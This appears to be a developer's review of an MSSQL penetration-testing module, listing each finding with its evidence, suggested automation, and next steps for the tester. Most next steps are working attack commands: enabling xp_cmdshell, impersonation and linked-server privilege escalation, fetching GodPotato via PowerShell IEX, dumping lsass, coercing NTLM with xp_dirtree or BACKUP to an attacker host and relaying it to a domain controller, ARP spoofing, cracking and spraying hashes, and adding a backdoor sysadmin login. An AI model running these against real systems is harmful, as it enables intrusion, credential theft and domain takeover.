summary: Very mature module (2497 LOC). Pre-auth: SQL Browser UDP 1434, TDS PRELOGIN version/encryption, TDS NTLM info leak (Type-1/Type-2), native SQL-auth login (TLS-over-TDS), weak-sa sweep, MSSQLSvc SPN emission. Credentialed: full impacket-mssqlclient enumeration of logins/dbs/trustworthy/links/impersonation/hashes/creds/proxies/serverperms/publicperms/startup + OPENROWSET file-read T1 probe + multi-hop impersonation-chain resolver + reversible write proof + recursive linked-server BFS + xp_dirtree/BACKUP-UNC coercion + xp_cmdshell/OLE/Agent/CLR RCE. Biggest gap: no true T3 automation — cred-verified sysadmin execution never wired to actual foothold (recce leaves shell to operator per user directive); NTLM relay is coercion-only, no bundled relay listener; Kerberoasting only emits SPN, doesn't request TGS itself.

findings.tier_evidence: weak_sa_sweep() executes a native TDS SQL-auth login and only fires the finding when LOGINACK is observed — cred is proven, not guessed.
findings.promotion_notes: Auto-run enable_xp_cmdshell + xp_cmdshell 'whoami' on hit and cache the shell handle in the session; write captured whoami into loot store.
findings.tester_next_step: impacket-mssqlclient sa@<ip> -p <port> (blank/known pw), then: enable_xp_cmdshell; xp_cmdshell whoami — for SeImpersonate follow with GodPotato/PrintSpoofer to SYSTEM.

findings.title_pattern: MSSQL login with a blank password (sysadmin -> RCE)
findings.tier_evidence: Blank-login finding gates strictly on nmap ms-sql-empty-password 'Login Success' marker or a parsed vuln — positive evidence only. Note weak-sa also covers this path at T2 natively.
findings.promotion_notes: Fold into weak_sa_sweep so the finding is always emitted by native verifier, not just nmap NSE; add explicit CVE-independent verify step.
findings.tester_next_step: impacket-mssqlclient sa@<ip> -p <port> with blank; then EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'.

findings.tier_evidence: Emitted from nmap ms-sql-xp-cmdshell script output OR from live sys.configurations query (cfg['xp_cmdshell']=='1'). Both are deterministic checks that the primitive is live.
findings.promotion_notes: When creds present, actually EXEC xp_cmdshell 'echo <canary>' via exec_command() and attach captured stdout as tier_evidence — the code already exists (build_exec_script). Only unwired for the enum-only path.
findings.tester_next_step: nxc mssql <ip> -u <user> -p <pass> -x whoami OR impacket-mssqlclient <user>@<ip> then xp_cmdshell whoami. Capture host + service acct + SeImpersonate for potato chain.

findings.tier_evidence: exec_command() runs a controlled command through xp/ole/agent primitives and captures stdout between @@X:out sentinels — output IS the proof. Narrative present in _NARRATIVE but not emitted directly as a kind; sysadmin_creds/xp_cmdshell drive execution.
findings.promotion_notes: Wire exec_command() output as a first-class 'rce_confirmed' finding kind (currently only narrative) so GUI shows the captured whoami as evidence, upgrading severity when SYSTEM or Domain Admin detected in output.
findings.tester_next_step: impacket-mssqlclient with creds; enable_xp_cmdshell; xp_cmdshell 'whoami /all' then whoami /priv — if SeImpersonate present, drop GodPotato via powershell -c IEX to reach NT AUTHORITY\SYSTEM.

findings.title_pattern: Credentials are sysadmin on this MSSQL instance
findings.tier_evidence: Emitted only when live SELECT IS_SRVROLEMEMBER('sysadmin')=1 for the connected login. Confirmed capability, not inferred.
findings.promotion_notes: Same as xp_cmdshell: run exec_command via 'xp' automatically on sysadmin verify and attach captured whoami / hostname / sid; converts capability finding to proof-of-exploit.
findings.tester_next_step: impacket-mssqlclient <domain>/<user>:<pass>@<ip>; enable_xp_cmdshell; xp_cmdshell whoami. From there SeImpersonate -> potato -> SYSTEM -> lsass.exe dump via mimikatz/nanodump.

findings.tier_evidence: Live query sys.server_permissions where permission_name='IMPERSONATE' AND grantor is sysadmin — deterministic capability check.
findings.promotion_notes: Execute EXECUTE AS LOGIN='<sa>'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin'); REVERT and attach the observed context switch as evidence.
findings.tester_next_step: In mssqlclient: EXECUTE AS LOGIN='sa'; SELECT IS_SRVROLEMEMBER('sysadmin'); then EXEC xp_cmdshell 'whoami'; REVERT.

findings.title_pattern: TRUSTWORTHY database owned by a sysadmin (privesc)
findings.tier_evidence: Emitted from live sys.databases (is_trustworthy_on=1 AND owner in sysadmin set). Elevated to critical + 'CONFIRMED' when verify_dbowner() runs and IS_MEMBER('db_owner')=1 in the target DB context — that's a T2 confirmation of the escalation primitive.
findings.promotion_notes: When dbo_map confirms db_owner, auto-create the WITH EXECUTE AS OWNER proc under a temp name, invoke it to add current login to sysadmin, verify, and REVERT with sp_dropsrvrolemember + DROP PROCEDURE — reversible T2 proof (mirrors write_proof pattern).
findings.tester_next_step: USE [<trustdb>]; CREATE PROC dbo.x WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x; verify IS_SRVROLEMEMBER('sysadmin')=1; then EXEC sp_dropsrvrolemember.

findings.tier_evidence: Live sys.servers (is_linked=1) enumeration; walk_links BFS actually reaches each remote node with OPENQUERY/EXEC AT and returns real SYSTEM_USER + IS_SRVROLEMEMBER — deterministic reachability.
findings.promotion_notes: walk_links already returns login/sysadmin per node; auto-tag each node's chain with a canary SELECT and attach path for GUI graph.
findings.tester_next_step: SELECT * FROM OPENQUERY([LINKED], 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')'); if sa, EXEC('sp_configure ''xp_cmdshell'',1;RECONFIGURE;EXEC xp_cmdshell ''whoami''') AT [LINKED].

findings.tier_evidence: walk_links() ran the nested EXEC-AT chain and observed IS_SRVROLEMEMBER('sysadmin')=1 on the remote node's live result — that's proof the chain executes as sysadmin.
findings.promotion_notes: Auto-invoke _nested_at(path, _RCE_INNER) which enables xp_cmdshell AND runs whoami on the remote and captures output — code already there; just needs to be executed and stored as evidence rather than emitted as a copy-paste cmd.
findings.tester_next_step: EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''',1;RECONFIGURE;EXEC xp_cmdshell ''''whoami'''''') AT [HOP2]') AT [HOP1] — use link_runner then walk chain; capture whoami output on remote.

findings.title_pattern: Recovered N SQL login password hash(es)
findings.tier_evidence: SELECT name,password_hash FROM sys.sql_logins actually returned hashes — a foothold-grade capture of credential material.
findings.promotion_notes: Feed hashes into a bundled offline cracker sweep against a small wordlist (hashcat -m 1731 is airgap-friendly) and, on cracked, auto-spray back with sqlauth_login across all mssql_targets — chain step.
findings.tester_next_step: hashcat -m 1731 mssql_hashes.txt rockyou.txt; then for each cracked, sqlauth_login sprays across every discovered MSSQL — plus try each cracked pw against SMB/LDAP for account reuse.

findings.title_pattern: Arbitrary file read via OPENROWSET(BULK) confirmed
findings.tier_evidence: The fileread enum section actually SELECTs C:\Windows\System32\drivers\etc\hosts via OPENROWSET(BULK, SINGLE_CLOB) and returns 64-byte proof sample — controlled canary read confirms primitive.
findings.promotion_notes: Automate follow-on reads of well-known sensitive files (C:\inetpub\wwwroot\web.config, C:\ProgramData\<app>\config, C:\Windows\System32\config\SYSTEM copy via VSS) and parse for connection strings — feed into known_creds.
findings.tester_next_step: SELECT BulkColumn FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x; grep <add name= for DB connection strings and reuse.

findings.title_pattern: MSSQL impersonation chain to sysadmin available
findings.tier_evidence: impersonate_chain query lists login + IS_SRVROLEMEMBER + onward-impersonation count from live sys.server_permissions — evidence of transitive hop existence.
findings.promotion_notes: Walk the resolved chain via nested EXECUTE AS ... EXECUTE AS ... blocks with a canary IS_SRVROLEMEMBER at the end and REVERT; capture the terminal sysadmin=1 as proof.
findings.tester_next_step: EXECUTE AS LOGIN='<hop1>'; EXECUTE AS LOGIN='<hop2>'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin'); REVERT; REVERT — then xp_cmdshell inside the sa context.

findings.tier_evidence: Reads sys.credentials + msdb.dbo.sysproxies identity strings only — the passwords remain encrypted with SMK. Enumeration of privilege-carrying objects, not proof they can be decrypted.
findings.promotion_notes: Port PowerUpSQL Get-SQLServerLinkedServerLogin's SMK-decryption path (T-SQL DAC + xp_ readvarbin) into a native T-SQL recovery script; on sysadmin, decrypt one and add to loot as proof. Requires DAC and sysadmin.
findings.tester_next_step: PowerUpSQL: Import-Module PowerUpSQL; Get-SQLCredential -Instance <ip>; Get-SQLServerLinkedServerLogin -Instance <ip> — needs sysadmin + DAC (add ,1434 to conn or -DAC).

findings.title_pattern: N linked server(s) with a stored fixed login
findings.tier_evidence: Enumerates sys.linked_logins where uses_self_credential=0 and remote_name is set — surfaces the *existence* of stored linked-server passwords; recce doesn't yet decrypt them.
findings.promotion_notes: Same as stored_credentials: implement SMK decryption of syslnklgns via DAC, prove one linked-server password recovery, elevate severity to critical when remote_name is 'sa'.
findings.tester_next_step: mssqlpwner <domain>/<user>:<pass>@<ip> get-linked-server-password (needs sa+DAC); then reuse recovered pw against remote via impacket-mssqlclient.

findings.title_pattern: MSSQL discloses NetBIOS / domain / FQDN pre-auth (NTLM)
findings.tier_evidence: Native _build_login7_ntlm sends real NTLMSSP Type-1 and parses Type-2 AV_PAIRs; leak proven by successful Type-2 parse.
findings.promotion_notes: Already used to seed kerberoast_spn — feed dns_computer/nb_domain into shared known_hosts + known_domains surfaces so other modules stop re-probing.
findings.tester_next_step: responder -I <iface> already listening; then trigger EXEC xp_dirtree '\\<LHOST>\x' via any authenticated login to relay/capture the SQL svc acct.

findings.tier_evidence: Emits the computed SPN string MSSQLSvc/<fqdn>:<port> — asserts registration by domain-integration inference, does not request a TGS itself.
findings.promotion_notes: Integrate impacket-GetUserSPNs against a supplied domain user to actually request the TGS and capture the $krb5tgs$ hash — proof-of-exploit tier once hash is returned.
findings.tester_next_step: impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc-ip> -request; then hashcat -m 13100 tgs.hash rockyou.txt.

findings.title_pattern: MSSQL does not support login encryption (credential sniffing)
findings.tier_evidence: Parsed from server PRELOGIN encryption option byte == 2 (not supported) — deterministic server assertion.
findings.promotion_notes: Already at T1 — server tells us. Only promotion would be actually sniffing a real auth via mitm, which is out of scope.
findings.tester_next_step: Position on-path (ettercap -Tq -M arp:remote /<sqlclient>/ /<sqlsrv>/); capture with tcpdump port 1433; extract LOGIN7 payload — password is obfuscated with nibble-swap+0xA5, trivially reversed.

findings.tier_evidence: Version <= 12 (SQL 2014) from PRELOGIN — banner assertion only, no CVE proof.
findings.promotion_notes: Extend PRELOGIN version to CVE map (like MySQL/Postgres modules do) — CVE-2020-0618 (RS-RCE), CVE-2021-1636 (SSMS), CVE-2022-29143 — emit per-CVE candidate findings.
findings.tester_next_step: For SQL 2012/2014 SSRS on same host: msf exploit/windows/mssql/mssql_ssrs_navcorrector (CVE-2020-0618); otherwise consult MSRC bulletins.

findings.tier_evidence: SERVERPROPERTY('IsIntegratedSecurityOnly')=0 — server config assertion, not evidence of any weak account.
findings.promotion_notes: Cross-reference with weak_sa_sweep result and any looted hashes to confirm the config actually enables an attack — auto-upgrade when a spray hit lands.
findings.tester_next_step: nxc mssql <ip> -u sa -p passwords.txt --local-auth --continue-on-success — with the sa hash from sys.sql_logins if you already have that.

findings.title_pattern: Dangerous server-level permission held (privesc without sysadmin)
findings.tier_evidence: Live sys.fn_my_permissions(NULL,'SERVER') intersected with the _DANGEROUS_SERVER_PERMS set — proof this specific login holds the grant right now.
findings.promotion_notes: For each detected perm (IMPERSONATE ANY LOGIN, ALTER ANY LOGIN, CONTROL SERVER, ADMINISTER BULK OPERATIONS) run the specific abuse (EXECUTE AS sa, ALTER LOGIN sa WITH PASSWORD, BULK read /etc/hosts canary) and attach output.
findings.tester_next_step: IMPERSONATE ANY LOGIN: EXECUTE AS LOGIN='sa'; ALTER ANY LOGIN: ALTER LOGIN sa WITH PASSWORD='Recce!123'; CONTROL SERVER: implicit sa. Then xp_cmdshell whoami.

findings.title_pattern: Server permission granted to public (every login inherits it)
findings.tier_evidence: Live sys.server_permissions where grantee=public AND state=GRANT AND perm outside baseline — deterministic.
findings.promotion_notes: Where the granted perm intersects DANGEROUS_SERVER_PERMS, drive the abuse from a freshly-created low-priv login (or existing guest) to prove the public inheritance is exploitable end-to-end.
findings.tester_next_step: CREATE LOGIN test WITH PASSWORD='x'; login as test; verify inherited dangerous perm; then abuse per server_perms tester step.

findings.tier_evidence: master.sys.procedures ExecIsStartup=1 — inventory only, no attempt to inspect proc body for maliciousness.
findings.promotion_notes: Fetch OBJECT_DEFINITION for each startup proc and regex for xp_cmdshell/OLE/net user — surface persistence candidates directly rather than a plain list.
findings.tester_next_step: SELECT name, OBJECT_DEFINITION(object_id) FROM master.sys.procedures WHERE OBJECTPROPERTY(object_id,'ExecIsStartup')=1; hunt for xp_cmdshell / EXEC master.dbo. / net user.

findings.tier_evidence: Live sys.database_permissions check that grantee='guest' AND permission='CONNECT' AND state='GRANT' inside each db — deterministic capability.
findings.promotion_notes: EXECUTE AS USER='guest'; enumerate tables and permissions accessible under guest — proves the boundary is actually gone rather than merely configured that way.
findings.tester_next_step: USE [<db>]; EXECUTE AS USER='guest'; SELECT * FROM INFORMATION_SCHEMA.TABLES; sample any sensitive table listed.

findings.tier_evidence: Live sys.database_permissions for grantee in (public,guest) with GRANT and strong perm (INSERT/UPDATE/EXECUTE/CONTROL/SELECT) — deterministic per-object capability.
findings.promotion_notes: For each public-EXEC procedure, actually EXEC it (or check its definition for SETUSER/EXECUTE AS) — prove callable escalation primitive.
findings.tester_next_step: For public EXECUTE grants on procs: EXEC <schema>.<proc>; for SELECT grants: SELECT TOP 20 * FROM <schema>.<table>.

findings.title_pattern: Sensitive data accessible in the databases
findings.tier_evidence: run_datamine actually SELECTs sys.tables/columns and returns row-count + interesting column names — proves the data is reachable. Finding is informational when no interesting names found.
findings.promotion_notes: For each interesting column, SELECT TOP 3 with regex-redaction (mirror the mysql/postgres datamine) so the finding carries a redacted sample; then feed detected password-shaped values into known_creds.
findings.tester_next_step: In mssqlclient: SELECT TOP 20 <col1>,<col2> FROM <db>.<schema>.<table>; if pwd/token cols, hashcat/crack + reuse via nxc across the estate.

findings.tier_evidence: build_write_proof_script actually CREATEs a table, UPDATEs a canary row, and (when sysadmin) CREATE LOGIN + ALTER SERVER ROLE ADD MEMBER then REVERTs everything; parse_write_proof reads back the before/after evidence — reversible proof of write and role-add primitives.
findings.promotion_notes: Once role-add is proven possible, keep the temp login for the rest of the session with a random password stored in loot as ephemeral persistence (undone at analyze() end) — that's a full T3 foothold.
findings.tester_next_step: CREATE LOGIN recce_x WITH PASSWORD='R3cce!Aa', CHECK_POLICY=OFF; ALTER SERVER ROLE sysadmin ADD MEMBER recce_x — then sqlauth_login as recce_x from remote.

findings.title_pattern: UNC coercion -> NTLM relay of the SQL service account
findings.tier_evidence: run_xp_dirtree drives an authenticated EXEC xp_dirtree '\\<lhost>\recce' — coercion primitive is triggered on the wire; the target authenticating outbound is deterministic behaviour.
findings.promotion_notes: Bundle a minimal relay listener (or shell out to impacket-ntlmrelayx configured against selected relay_targets) so the coerced NetNTLM is actually landed and captured — recce currently generates the trigger but leaves relaying to the operator.
findings.tester_next_step: Terminal 1: impacket-ntlmrelayx -t ldaps://<dc> --delegate-access --no-dump; Terminal 2: EXEC master..xp_dirtree '\\<LHOST>\recce' via mssqlclient — SQL svc acct relays to DC for RBCD.

findings.tier_evidence: build_backup_unc_script + run_backup_unc actually run BACKUP DATABASE ... TO DISK='\\<lhost>\...' and RESTORE VERIFYONLY under any login holding BACKUP DATABASE — coercion is deterministic on the wire. Narrative + code exist but the emitted finding-kind for the primitive is not currently in findings() (needs wiring).
findings.promotion_notes: Auto-fire when the current login lacks xp_cmdshell/sysadmin but has BACKUP DATABASE (check via IS_SRVROLEMEMBER('dbcreator') / db-level backup rights), pair with bundled ntlmrelayx.
findings.tester_next_step: ntlmrelayx -t smb://<target> -smb2support; then BACKUP DATABASE master TO DISK='\\<LHOST>\r\x.bak' WITH INIT (as any BACKUP-rights account).
